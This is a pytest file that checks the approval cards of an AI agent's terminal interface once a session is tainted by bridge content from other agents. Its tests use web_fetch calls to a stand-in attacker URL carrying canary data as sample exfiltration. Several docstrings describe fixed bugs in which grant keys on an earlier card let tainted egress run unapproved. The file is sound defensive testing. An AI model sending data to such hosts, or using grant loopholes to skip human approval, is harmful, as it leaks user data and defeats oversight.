"""The TUI approval card in a Team-Bridge-latched session (team-bridge-egress.md: "Cards",
"Grants").

Drives the REAL app and the gate it installs on the session, the way a tool
call reaches it. Rows: T22 (Allow/Deny only; ``A``, ``S``, ``G`` inert -- no
setting written, no record), T22c/T22d (a pre-latch ``A`` does not approve a
call once the session latches), and the clean control (a session without
bridge content keeps its three answers and its escapes).
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from local_operator.paths import CONFIG_DIR_ENV
from local_operator.tui.app import OperatorApp
from tests.unit.tui.test_app_pilot import _factory
from tests.unit.tui.test_approvals_ux import GatedSession, _boot, _gate, _wait_prompt


@pytest.fixture
def config_dir(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    monkeypatch.setenv(CONFIG_DIR_ENV, str(tmp_path))
    return tmp_path


def _labels(app: OperatorApp) -> list[str]:
    card = app._approval
    assert card is not None, "no card is on screen"
    return [option.label for option in card._questions[0].options]


@pytest.mark.asyncio
async def test_a_pre_latch_allow_all_stops_covering_and_the_latched_card_has_no_escape(
    config_dir: Path,
) -> None:
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        # Clean session: three answers; the operator presses A on a bash card.
        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        await pilot.press("A")
        assert await first is True
        assert app._approve_all is True
        assert await gate("bash", "ls again") is True  # covered while clean

        # A bridge card arrives: the session latches.
        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch allow-all approved tainted egress"
        assert _labels(app) == ["Allow", "Deny"]
        records_before = sorted(p.name for p in config_dir.rglob("*"))
        for key in ("A", "S", "G"):
            await pilot.press(key)
            await pilot.pause()
            assert not tainted.done(), f"{key} answered a latched card"
        assert sorted(p.name for p in config_dir.rglob("*")) == records_before
        await pilot.press("n")
        assert await tainted is False


@pytest.mark.asyncio
async def test_t22d_iv_a_pre_latch_card_g_is_a_session_grant_in_the_issuing_session(
    config_dir: Path,
) -> None:
    """Review S-61: the card's ``G`` sets the machine default to auto, but in
    the conversation that pressed it the grant is a SESSION grant (as the
    desktop's "All sessions" already is), so it stops covering calls once
    this conversation latches."""
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        first = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        await pilot.press("G")
        await pilot.pause()
        if not first.done():
            await pilot.press("y")
        assert await first is True
        assert app._approve_all is True
        assert app._interaction.draft.approve_scope == "session"
        assert await gate("bash", "ls again") is True  # covered while clean

        session.bridge_latched = True  # type: ignore[attr-defined]
        tainted = asyncio.ensure_future(
            gate(
                "web_fetch",
                "https://atk.test/?d=LOPCANARY",
                taint_raised=True,
                bridge_latched=True,
            )
        )
        await _wait_prompt(pilot, app)
        assert not tainted.done(), "a pre-latch card G approved latched egress"
        await pilot.press("n")
        assert await tainted is False


class _LatchingSession(GatedSession):
    """A gated fake with a REAL latch, so the app's latch watcher installs.

    ``bridge_latched`` reads the latch the way ``Session`` does, which is what
    lets a test latch the session while a card is already parked.
    """

    def __init__(self) -> None:
        super().__init__()
        from local_operator.harness.bridge_egress import BridgeTaintLatch

        self.bridge_taint_latch = BridgeTaintLatch()

    @property
    def bridge_latched(self) -> bool:
        return self.bridge_taint_latch.latched


def _approvals_records(config_dir: Path) -> dict[str, bytes]:
    # Every settings-shaped file: ``S`` writes the conversation's
    # ``approvals.json``, ``G`` the machine default in the config.
    return {
        str(p.relative_to(config_dir)): p.read_bytes()
        for p in config_dir.rglob("*")
        if p.is_file() and p.suffix in {".json", ".toml", ".yaml", ".yml"}
    }


async def _latched_egress_still_asks(pilot, app: OperatorApp, gate) -> None:
    tainted = asyncio.ensure_future(
        gate(
            "web_fetch",
            "https://atk.test/?d=LOPCANARY-Q11",
            taint_raised=True,
            bridge_latched=True,
        )
    )
    await _wait_prompt(pilot, app)
    assert not tainted.done(), "latched egress ran with no card after a parked-card key"
    await pilot.press("n")
    assert await tainted is False


@pytest.mark.asyncio
@pytest.mark.parametrize("key", ["S", "G", "A"])
async def test_q11_press_time_refusal_on_a_card_parked_across_the_latch(
    config_dir: Path, key: str
) -> None:
    """QA Q-11, the exact repro: a card raised while the session was clean
    keeps its build-time ``S``/``G`` callbacks after the session latches (this
    fake has no latch object, so nothing re-renders the card). Before the fix
    ``S``/``G`` reached ``_set_approve_all`` while latched and wrote a grant
    stamped ``granted_while_latched``, and the next latched ``web_fetch`` ran
    with no card. The setters now refuse at press time and write nothing."""
    session = GatedSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        records_before = _approvals_records(config_dir)

        session.bridge_latched = True  # type: ignore[attr-defined]
        await pilot.press(key)
        await pilot.pause()
        assert app._approve_all is False, f"{key} on a parked card granted auto"
        assert app._interaction.draft.approve_granted_while_latched is not True
        assert _approvals_records(config_dir) == records_before
        if key != "A":
            # A setting key never answers a card; ``A`` still answers THIS
            # call (the person allowed it) but grants nothing beyond it.
            assert not parked.done(), f"{key} answered the parked card"
        if not parked.done():
            await pilot.press("y")
        assert await parked is True
        await _latched_egress_still_asks(pilot, app, gate)


@pytest.mark.asyncio
@pytest.mark.parametrize("key", ["S", "G", "A"])
async def test_q11_a_parked_card_is_re_rendered_when_the_latch_fires(
    config_dir: Path, key: str
) -> None:
    """QA Q-11: a card raised while the session was clean, answered after a
    teammate's-agent message latched it. Before the fix ``S``/``G`` on that
    card reached ``_set_approve_all`` while latched and wrote a grant stamped
    ``granted_while_latched``, so the next latched ``web_fetch`` ran with no
    card. Now the card is re-rendered as the latched card when the latch
    fires, the setters refuse at press time (writing nothing), and the next
    latched egress still asks."""
    session = _LatchingSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        card = app._approval
        records_before = _approvals_records(config_dir)

        # The bridge message lands while the card is parked.
        session.bridge_taint_latch.mark()
        await pilot.pause()
        assert _labels(app) == ["Allow", "Deny"], "the parked card kept Allow all"

        await pilot.press(key)
        await pilot.pause()
        assert app._approve_all is False, f"{key} on a parked card granted auto"
        assert app._interaction.draft.approve_granted_while_latched is not True
        assert _approvals_records(config_dir) == records_before
        assert not parked.done(), f"{key} answered the parked card"

        # Press-time refusal on its own (the card still holding its escapes,
        # as if the re-render had not run): writes nothing either.
        setter = app._set_session_auto_for_card if key != "G" else app._set_global_auto_for_card
        outcome = setter(app._interaction)
        assert outcome is not None and outcome.kind == "refused"
        assert app._approve_all is False
        assert _approvals_records(config_dir) == records_before
        assert card is app._approval

        await pilot.press("y")
        assert await parked is True
        await _latched_egress_still_asks(pilot, app, gate)


@pytest.mark.asyncio
async def test_y3_a_latch_in_another_conversation_leaves_this_card_alone(
    config_dir: Path,
) -> None:
    """Review Y3: the latch-time redraw is scoped to the conversation that
    latched (``_latch_parked_cards`` matches ``source_binding`` to the latching
    source's token). A second conversation latching through the REAL watcher
    must leave the first conversation's parked card at its three answers; the
    first conversation latching then restyles it."""
    from local_operator.tui.session_interaction import SessionInteraction

    session = _LatchingSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]

        other = _LatchingSession()
        other_source = SessionInteraction(other)
        assert other_source.token != app._interaction.token
        app._watch_bridge_latch(other, other_source)
        other.bridge_taint_latch.mark()
        await pilot.pause()
        await pilot.pause()
        assert _labels(app) == [
            "Allow",
            "Deny",
            "Allow all",
        ], "another conversation's latch restyled this conversation's card"

        session.bridge_taint_latch.mark()
        await pilot.pause()
        assert _labels(app) == ["Allow", "Deny"], "the scoping test's positive control"
        await pilot.press("y")
        assert await parked is True


@pytest.mark.asyncio
@pytest.mark.parametrize("kind", ["agent_message", "other_session"])
async def test_u1_u4_latched_card_names_its_source_and_flashes_withdrawn_keys(
    config_dir: Path, monkeypatch: pytest.MonkeyPatch, kind: str
) -> None:
    """U1: the card's notice wording follows the latch's source kind; the card
    shape does not. U4: A/S/G on a latched card flash the "options are off"
    line instead of doing nothing, and never answer or reach the composer."""
    from local_operator.harness import bridge_egress as be
    from local_operator.tui.widgets import approval as approval_mod

    # The flash length is read when a press arms the timer. Hold it long while
    # the presses are asserted (a 0.2 s flash expired before the assertion on
    # a loaded host, failing at the base too), then shorten it for one last
    # press to prove the flash settles.
    monkeypatch.setattr(approval_mod, "LATCHED_FLASH_SECONDS", 30.0)
    session = _LatchingSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(100, 30)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)
        session.bridge_taint_latch.mark(kind)  # type: ignore[arg-type]
        pending = asyncio.ensure_future(
            gate("web_fetch", "https://atk.test/?d=x", taint_raised=True, bridge_latched=True)
        )
        await _wait_prompt(pilot, app)
        card = app._approval
        assert card is not None
        # Same card for both kinds; only the sentence differs.
        assert _labels(app) == ["Allow", "Deny"]
        expected = " ".join(be.bridge_card_notice(session.bridge_taint_latch).split())
        assert card._latched_notice == expected
        assert ("(Agent messages)" in expected) is (kind == "agent_message")

        options = " ".join(be.card_options_off_notice().split())
        # MINOR-2: the flash swaps a row's text in place; it must never add or
        # drop a row (a wrapped flash line would shift the card's layout).
        rest_rows = len(card._callout_rows(96, two_row=True)[0])
        for key in ("A", "S", "G"):
            await pilot.press(key)
            await pilot.pause()
            assert card._options_flash is True, f"{key} gave no feedback"
            assert not pending.done(), f"{key} answered a latched card"
            rows, _spans = card._callout_rows(96, two_row=True)
            assert len(rows) == rest_rows, f"{key} flash changed the row count"
            flashed = " ".join(row.plain for row in rows)
            assert options.split()[0] in flashed
            assert any(
                span.style and "bold" in str(span.style) for row in rows for span in row.spans
            )
        monkeypatch.setattr(approval_mod, "LATCHED_FLASH_SECONDS", 0.2)
        await pilot.press("A")
        await pilot.pause()
        for _ in range(50):
            if not card._options_flash:
                break
            await asyncio.sleep(0.1)
        assert card._options_flash is False, "the flash did not settle"
        assert app._approve_all is False
        await pilot.press("n")
        assert await pending is False


class _ViewerSession(GatedSession):
    """A gated fake carrying a VIEWER's mirror latch (``AttachedSession``).

    The mirror is marked from the owner's re-published card, never by this
    process; the app must redraw the parked card from it but leave the
    latch-time notice to the owner's own notice stream.
    """

    def __init__(self) -> None:
        super().__init__()
        from local_operator.harness.bridge_egress import BridgeTaintLatch

        self.bridge_taint_latch = BridgeTaintLatch(mirror=True)

    @property
    def bridge_latched(self) -> bool:
        return self.bridge_taint_latch.latched


@pytest.mark.asyncio
async def test_r7_lead_a_viewer_card_parked_before_the_latch_is_redrawn_from_the_mirror(
    config_dir: Path,
) -> None:
    """Security r7 lead on #3796: a viewer's card raised while the session was
    clean was never redrawn (the facade had no latch, so no watcher), and its
    ``G`` routed ``approvals default auto``. The owner's re-publish marks the
    viewer's mirror latch; the app's existing watcher then turns the parked
    card into the Allow/Deny card, and ``G`` writes nothing."""
    session = _ViewerSession()
    app = OperatorApp(lambda: _factory(session))
    async with app.run_test(size=(120, 40)) as pilot:
        await _boot(pilot, app)
        app._set_approve_all(False)
        gate = _gate(session)

        parked = asyncio.ensure_future(gate("bash", "ls"))
        await _wait_prompt(pilot, app)
        assert _labels(app) == ["Allow", "Deny", "Allow all"]
        records_before = _approvals_records(config_dir)

        session.bridge_taint_latch.mark()
        await pilot.pause()
        assert _labels(app) == ["Allow", "Deny"], "the viewer's parked card kept Allow all"

        await pilot.press("G")
        await pilot.pause()
        assert _approvals_records(config_dir) == records_before
        assert not parked.done(), "G answered the parked card"
        await pilot.press("y")
        assert await parked is True
